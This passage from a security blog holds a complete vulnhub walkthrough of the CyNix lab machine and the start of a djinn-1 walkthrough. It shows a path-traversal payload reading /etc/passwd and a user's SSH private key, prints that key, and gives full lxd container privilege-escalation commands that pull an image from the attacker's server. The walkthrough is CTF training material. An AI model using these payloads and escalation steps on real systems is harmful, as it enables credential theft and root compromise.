<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MW9WOEo0bzNSOFdQMjVmbklNeTBaS2RaaS05N2VOUDZi">https://drive.google.com/open?id=1oV8J4o3R8WP25fnIMy0ZKdZi-97eNP6b<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmE=">https://download.vulnhub.com/cynix/CyNix.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmEudG9ycmVudA==">https://download.vulnhub.com/cynix/CyNix.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Intermediate-Hard</li>
<li>User flag: user.txt</li>
<li>Root flag: root.txt</li>
<li>Description: It’s a Boot2Root machine. The machine is VirtualBox compatible but can be used in VMWare as well (not tested but it should work). The DHCP will assign an IP automatically. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively. Enjoy pwning it!</li>
</ul>
<p>We recommend that you use VirtualBox and not VMware for this VM</p>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.56.*</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.125</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p>then Get more detailed information</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -T4 -v -p- 192.168.56.125</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">6688/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6d:df:0d:37:b1:3c:86:0e:e6:6f:84:b9:28:11:ee:68 (RSA)</span><br><span class="line">|   256 8f:3e:c0:08:03:13:e8:64:89:f6:f9:63:b3:88:99:2a (ECDSA)</span><br><span class="line">|_  256 fb:e3:40:e6:91:0b:3c:bc:b7:0e:c7:bd:ef:a2:93:<span class="built_in">fc</span> (ED25519)</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>i use dirbuster for Web Directory scanning, get the following results</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/icons    403</span><br><span class="line">/lavalamp    200</span><br><span class="line">/server-status    403</span><br></pre></td></tr></table></figure>

<p>turn to contact page,i use burp got the following request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/</span><br><span class="line"></span><br><span class="line">name=<span class="built_in">test</span>&amp;email=ccasdcasdcas%40qq.com&amp;subject=fuckyou&amp;message=wocaonimacasdcasdcasd</span><br></pre></td></tr></table></figure>

<p>then go to </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.125/lavalamp/canyoubypassme.php</span><br></pre></td></tr></table></figure>

<p>check the source code</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;table width=<span class="string">&quot;40%&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;0&quot;</span> margin=<span class="string">&quot;20%&quot;</span> class=<span class="string">&quot;tb1&quot;</span> style=<span class="string">&quot;margin:2% 30%;opacity: 0.0;&quot;</span>&gt;</span><br><span class="line">   &lt;tr&gt;&lt;td align=center style=<span class="string">&quot;padding: 3%;&quot;</span>&gt;</span><br><span class="line">    &lt;form method=post action=<span class="string">&quot;/lavalamp/canyoubypassme.php&quot;</span>&gt;Specify a number: &lt;input <span class="built_in">type</span>=text name=file placeholder=<span class="built_in">integer</span>&gt;&lt;br&gt;&lt;br&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="built_in">read</span> value=<span class="string">&quot;Download the number&quot;</span>&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>now change the opacity 0:0 to 1:0, and see what will happen</p>
<p>we got a visible form by doing that,then use burp intercept the data</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/canyoubypassme.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">file=21212&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>edit the poc to triggerthe LFI</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../etc/passwd&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>responese:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line">                &lt;div id=<span class="string">&quot;right&quot;</span>&gt;&lt;/div&gt;&lt;div align=center&gt;&lt;textarea rows=20 cols=60&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">ford:x:1000:1000:ford,,,:/home/ford:/bin/bash</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p>edit again to read ford user’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../home/ford/.ssh/id_rsa&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>and we got ford’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAk1VUtcYuZmM1Zmm4yNpguzzeocGpMVYC540yT90QqaD2Bsal</span><br><span class="line">zYqvHKEh++bOL6QTSr0NjU9ifT/lBIVSIA0TpjUTkpdIW045H+NlgMhN0q/x6Yy2</span><br><span class="line">LofuB4LQqRzr6cP0paoOYNq1KYG3QF1ouGa4k1i0td4DepBxcu4JBMOm20E7BurG</span><br><span class="line">zo41f/YWjC5DurNjIchzl4GyBClMGSXWbIbr6sYwVx2OKyiPLFLYusrNqwJNQvxz</span><br><span class="line">Mf5yolEYI8WOXJzCfiPQ5VG8KXBH3FHu+DhFNgrJQjgowD15ZMQ1qpO/2FMhewR6</span><br><span class="line">gcDs7rCLUUXc9/7uJ7e3zHlUyDgxakYohn3YiQIDAQABAoIBAE/cfSJa3mPZeuSc</span><br><span class="line">gfE9jhlwES2VD+USPljNDGyF47ZO7Y0WuGEFv43BOe6VWUYxpdNpTqM+WKCTtcwR</span><br><span class="line">iEafT/tT4dwf7LSxXf2PAUIhUS3W+UYjY80tGTUxD3Hbn3UDJuV1nH2bj3+ENJTL</span><br><span class="line">DSyHYZ1dA/dg9HnHOfeWV4UhmJxXmOAOKgU9Z73sPn4bYy4B3jnyqWn392MsQftr</span><br><span class="line">69ZYauTjku9awpuR5MAXMJ9bApk9Q7LZYwwGaSZw8ceMEUj7hkZBtP9W9cilCOdl</span><br><span class="line">rFXnkc8CvUpLh+hX6E/JOCGsUvdPuVLWKd2bgdK099GrRaenS8SlN0AUTfyNiqg4</span><br><span class="line">VE7V8AECgYEAwoGVE+Z8Tn+VD5tzQ0twK+cP2TSETkiTduYxU3rLqF8uUAc3Ye/9</span><br><span class="line">TLyfyIEvU7e+hoKltdNXHZbtGrfjVbz6gGuGehIgckHPsZCAQLPwwEqp0Jzz9eSw</span><br><span class="line">qXI0uM7n2vSdEWfCAcJBc559JKZ5uwd0XwTPNhiUqe6DUDUOZ7kI34ECgYEAwenM</span><br><span class="line">gMEaFOzr/gQsmBNyDj2gR2SuOYnOWfjUO3DDleP7yXYNTcRuy6ke1kvMhf9fWw7h</span><br><span class="line">dq3ieU0KSHrNUQ9igFK5C8FvsB+HUyEjfVpNhFppNpWUUWKDRCypbmypLg0r+9I7</span><br><span class="line">myrdBFoYv30WKVsEHus1ye4nJzKjCtkgmjYMfQkCgYA0hctcyVNt2xPEWCTC2j8b</span><br><span class="line">C9UCwSStAvoXFEfjk/gkqjcWUyyIXMbYjuLSwNen0qk3J1ZaCAyxJ8009s0DnPlD</span><br><span class="line">7kUs93IdiFnuR+fqEO0E7+R1ObzC/JMb3oQQF4cSYBV92rfPw8Xq07RVTkL21yd8</span><br><span class="line">dQ8DO5YBYS/CW+Fc7uFPgQKBgHWAVosud792UQn7PYppPhOjBBw+xdPXzVJ3lSLv</span><br><span class="line">kZSiMVBCWI1nGjwOnsD77VLFC+MBgV2IwFMAe9qvjvoveGCJv9d/v03ZzQZybi7n</span><br><span class="line">KVGp91c8DEPEjgYhigl/joR5Ns3A9p1vu72HWret9F/a5wRVQqK5zL/Tzzgjmb3Y</span><br><span class="line">QnkBAoGAVosEGOE7GzBMefGHjQGMNKfumeJ01+Av6siAI6gmXWAYBaU618XhFEh1</span><br><span class="line">+QNoLgWvSXoBuN+pMkxnRCfMTNbD1wSk46tW3sWHkZdV31gKceOifNzMVw53bJHP</span><br><span class="line">/kto0eGJ/vgM0g9eyqmcpPTVqf7EwkJdo0LngOprNyTk+54ZiUg=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>then we easily get user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># mousepad key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># chmod 700 key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125</span></span><br><span class="line">ssh: connect to host 192.168.56.125 port 22: Connection refused</span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125 -p 6688</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.125]:6688 ([192.168.56.125]:6688)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:4l9whYX6vUaC+OGLPBYRWd7sw10HKH1wJU+FcVVeJyQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.125]:6688<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"> _____  _    _  ____  ______ _   _ _______   __</span></span><br><span class="line"><span class="string">|  __ \| |  | |/ __ \|  ____| \ | |_   _\ \ / /</span></span><br><span class="line"><span class="string">| |__) | |__| | |  | | |__  |  \| | | |  \ V / </span></span><br><span class="line"><span class="string">|  ___/|  __  | |  | |  __| | . ` | | |   &gt; &lt;  </span></span><br><span class="line"><span class="string">| |    | |  | | |__| | |____| |\  |_| |_ / . \ </span></span><br><span class="line"><span class="string">|_|    |_|  |_|\____/|______|_| \_|_____/_/ \_\</span></span><br><span class="line"><span class="string">                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Nov  8 16:46:44 2019 from 10.80.3.41</span></span><br><span class="line"><span class="string">ford@blume:~$ id</span></span><br><span class="line"><span class="string">uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd)</span></span><br><span class="line"><span class="string">ford@blume:~$ whoami</span></span><br><span class="line"><span class="string">ford</span></span><br><span class="line"><span class="string">ford@blume:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">ford@blume:~$ cat user.txt</span></span><br><span class="line"><span class="string">02d6267ed96e6b615b031dafe9607151</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub274.jpg"></li>
</ul>
<h3 id="lxd-privilege-escalation"><a href="#lxd-privilege-escalation" class="headerlink" title="lxd privilege escalation"></a>lxd privilege escalation</h3><p>reference to the following article</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbi8=">lxd privilege escalation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>use the following commands to build the lxd image for later useage</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p>transfer alpine-v3.11-x86_64-20200119_0151.tar.gz to victim’s machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.56.125 - - [21/May/2020 00:51:58] <span class="string">&quot;GET /alpine-v3.11-x86_64-20200119_0151.tar.gz HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ wget http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">--2020-05-21 10:21:57--  http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">Connecting to 192.168.56.126:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3226602 (3.1M) [application/gzip]</span><br><span class="line">Saving to: ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’</span><br><span class="line"></span><br><span class="line">alpine-v3.11-x86_64-20200 100%[==================================&gt;]   3.08M  --.-KB/s    <span class="keyword">in</span> 0.06s   </span><br><span class="line"></span><br><span class="line">2020-05-21 10:21:57 (50.3 MB/s) - ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’ saved [3226602/3226602]</span><br></pre></td></tr></table></figure>

<p>then added as an image to LXD as follows:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image import ./alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br></pre></td></tr></table></figure>

<p>Use the list command to check the list of images</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image list</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| myimage | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | May 21, 2020 at 5:39am (UTC) |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">ford@blume:/tmp$ lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">ford@blume:/tmp$ lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device mydevice added to ignite</span><br><span class="line">ford@blume:/tmp$ lxc start ignite</span><br><span class="line">ford@blume:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>Once inside the container, navigate to /mnt/root to see all resources from the host machine.</p>
<p>After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the root flag and found it.</p>
<p>and finally find the root.txt at last</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root/root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt</span></span><br><span class="line">Oh Yeah! Finally Pwned!</span><br><span class="line"></span><br><span class="line">Here<span class="string">&#x27;s your root flag:</span></span><br><span class="line"><span class="string">b0f971eddce7bd007e9f50ca02f5fe11</span></span><br><span class="line"><span class="string">    ____   __                      __    _  __ ______</span></span><br><span class="line"><span class="string">   /  _/  / /____  _   __ ___     / /   | |/ // ____/</span></span><br><span class="line"><span class="string">   / /   / // __ \| | / // _ \   / /    |   // /     </span></span><br><span class="line"><span class="string"> _/ /   / // /_/ /| |/ //  __/  / /___ /   |/ /___   </span></span><br><span class="line"><span class="string">/___/  /_/ \____/ |___/ \___/  /_____//_/|_|\____/   </span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string">https://www.linkedin.com/in/sumit-verma-125576129/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub275.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>change the opacity 0:0 to 1:0 to show the form</li>
<li>use LFI to read /etc/passwd and ssh key</li>
<li>lxd privilege escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[djinn-1]</title>
    <url>/2020/05/21/djinn-1/</url>
    <content><![CDATA[<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: djinn: 1<br>Date release: 18 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTGxUNUpjZGx5RFVjdmtuMTJ0OW9JSUZvMFg5R3Q1M0Ivdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1LlT5JcdlyDUcvkn12t9oIIFo0X9Gt53B/view?usp=sharing<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmE=">https://download.vulnhub.com/djinn/djinn.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmEudG9ycmVudA==">https://download.vulnhub.com/djinn/djinn.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Beginner-Intermediate</li>
<li>flags: user.txt and root.txt</li>
<li>Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You’ll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.</li>
<li>Format: Virtual Machine (Virtualbox - OVA)</li>
<li>Operating System: Linux</li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.127</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 08:00:27:03:DB:2D (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -v -p- -T4 192.168.56.127</span></span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">21/tcp   open     ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.126</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">1337/tcp open     waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     ____ _____ _ </span><br><span class="line">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span><br><span class="line">|     \x20/ _ \x20 | | | | <span class="string">&#x27;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span></span><br><span class="line"><span class="string">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span></span><br><span class="line"><span class="string">|     Let&#x27;</span>s see how good you are with simple maths</span><br><span class="line">|     Answer my questions 1000 <span class="built_in">times</span> and I<span class="string">&#x27;ll give you your gift.</span></span><br><span class="line"><span class="string">|     &#x27;</span>*<span class="string">&#x27;, 9)</span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|     ____ _____ _ </span></span><br><span class="line"><span class="string">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span></span><br><span class="line"><span class="string">|     \x20/ _ \x20 | | | | &#x27;</span>_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span><br><span class="line">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span><br><span class="line">|     Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">|     Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">|_    <span class="string">&#x27;+&#x27;</span>, 5)</span><br><span class="line">7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">|_http-title: Lost <span class="keyword">in</span> space</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>ftp anonymous login, then get three files</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># ftp 192.168.56.127</span></span><br><span class="line">Connected to 192.168.56.127.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.127:root): anonymous </span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get creds.txt</span><br><span class="line"><span class="built_in">local</span>: creds.txt remote: creds.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> creds.txt (11 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">11 bytes received <span class="keyword">in</span> 0.00 secs (109.6142 kB/s)</span><br><span class="line">ftp&gt; get game.txt</span><br><span class="line"><span class="built_in">local</span>: game.txt remote: game.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> game.txt (128 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">128 bytes received <span 